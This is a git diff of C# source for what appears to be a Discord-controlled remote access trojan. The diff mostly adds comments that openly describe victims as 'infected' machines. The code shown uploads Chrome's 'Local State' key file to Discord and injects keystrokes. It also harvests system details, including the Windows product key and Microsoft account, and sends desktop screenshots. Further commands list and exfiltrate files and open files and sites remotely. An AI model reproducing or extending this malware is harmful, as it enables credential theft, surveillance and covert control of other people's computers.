@@ -13,8 +13,9 @@ using System.Windows.Input;
 using System.Media;
 using Woof.SystemEx;
 
-#warning The Commands Are Really Difficult To Understand, I Don't Put Any Effort Into These Projects :3
+#warning The Commands Are Really Difficult To Understand, I Don't Put Any Effort Into These Projects :3 NOT WITH ME COOKIE
 
+// login with token
 namespace uwu_poggy_woggy_boy
 {
     public partial class winforms_are_bad : Form
@@ -46,6 +47,7 @@ namespace uwu_poggy_woggy_boy
             await Task.Delay(-1);
         }
 
+        // listen for bot commands and if true: run func
         public Task Commands(SocketMessage message)
         {
 
@@ -69,16 +71,16 @@ namespace uwu_poggy_woggy_boy
                 message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State");
             }
 
-            //make the host type anything u want :)
-
+            
+            // host type can be anythin u want.
             if (message.Content.StartsWith("+type "))
             {
                 var arg = message.Content.Split(new[] { "+type " }, StringSplitOptions.None)[1];
                 SendKeys.SendWait(arg);
             }
 
-            //gets the pc info
-
+            
+            // grabs the pc info = Newtork, MashineName, WinProduct_key, Microsoft_acc, disk_serialNum, Memory_total, Memory_free, osVersion, ...
             if (message.Content == "+get info")
             {
                 var owo = SystemInformation.BootMode;
@@ -113,8 +115,8 @@ namespace uwu_poggy_woggy_boy
                 message.Channel.SendMessageAsync(null, false, uwu.Build());
             }
 
-            //sends the desktop screenshots to discord
-
+            
+            // If screenshot command true: send screenshot of desktop via Discord
             if (message.Content == "+get desktop")
             {
                 if (Screen.AllScreens.Length >= 1)
@@ -141,8 +143,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //plays audio on the host device
-
+            
+            // if command true: Play custom audio on the infected device
             if (message.Content.Contains("+audio "))
             {
                 var arg = message.Content.Split(new[] { "+audio " }, StringSplitOptions.None)[1];
@@ -170,8 +172,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //plays looped audio on the host device
-
+            
+            // set audio mode to : Loop
             if (message.Content.Contains("+audioloop "))
             {
                 var arg = message.Content.Split(new[] { "+audioloop " }, StringSplitOptions.None)[1];
@@ -199,6 +201,7 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
+            // stop current audio
             if (message.Content == "+audiostop")
             {
                 try
@@ -223,8 +226,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //gets the file paths in a directory
-
+           
+            // Get files from infected mashine (only paths)
             if (message.Content.StartsWith("+get files"))
             {
                 var arg = message.Content.Split(new[] { "+get files" }, StringSplitOptions.None)[1];
@@ -255,8 +258,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //gets a file from a directory and uploads it
-
+            
+            // get file from dir and upload it via Discord
             if (message.Content.StartsWith("+get file "))
             {
                 var arg = message.Content.Split(new[] { "+get file " }, StringSplitOptions.None)[1];
@@ -276,8 +279,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //opens a file :|
-
+          
+            // open file on infected device
             if (message.Content.StartsWith("+open file "))
             {
                 var arg = message.Content.Split(new[] { "+open file " }, StringSplitOptions.None)[1];
@@ -297,8 +300,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //opens a website :|
-
+            
+            // open a website on the infected device
             if (message.Content.StartsWith("+open web "))
             {
                 var arg = message.Content.Split(new[] { "+open web " }, StringSplitOptions.None)[1];
@@ -332,8 +335,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
-            //sends a messagebox to the hosts pc
-
+            
+            // created a custom message box on the infected pc with cutom message content
             if (message.Content.StartsWith("+messagebox"))
             {
                 var arg = message.Content.Split(new[] { "+messagebox" }, StringSplitOptions.None)[1];
@@ -343,8 +346,8 @@ namespace uwu_poggy_woggy_boy
             return Task.CompletedTask;
         }
 
-        //gets the first desktop screen
-
+        
+        // define 1 desktop screen
         void Desktop()
         {
             Rectangle size = Screen.GetBounds(Point.Empty);
@@ -355,8 +358,8 @@ namespace uwu_poggy_woggy_boy
             cBitmap.Save(@"uwu.png", System.Drawing.Imaging.ImageFormat.Jpeg);
         }
 
-        //gets the second desktop screen
-
+        
+        // define 2 desktop screen
         void Desktop1()
         {
             Rectangle size = Screen.GetBounds(Point.Empty);
@@ -368,3 +371,6 @@ namespace uwu_poggy_woggy_boy
         }
     }
 }
+
+
+// comments by me https://github.com/cookie0o because he dumb :O
